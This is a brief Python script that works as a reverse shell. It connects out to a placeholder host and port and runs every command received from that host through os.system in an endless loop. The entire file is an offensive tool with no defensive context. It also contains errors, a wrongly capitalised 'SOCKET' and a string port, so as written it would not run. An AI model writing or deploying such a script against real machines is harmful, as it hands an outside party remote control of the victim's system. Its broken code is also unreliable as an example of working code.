#!/usr/bin/python

import socket
import os

HOST = '' #IP HERE
PORT = '' #PORT HERE

conn = socket.socket(SOCKET.AF_INET, socket.SOCK_STREAM) #CREATES TCP SOCKET

conn.connect((HOST, PORT)) #CONNECT

while 1: #LOOP
	command = conn.recv(1024) #RECEIVE COMMAND
	os.system(command) #EXECUTE COMMAND
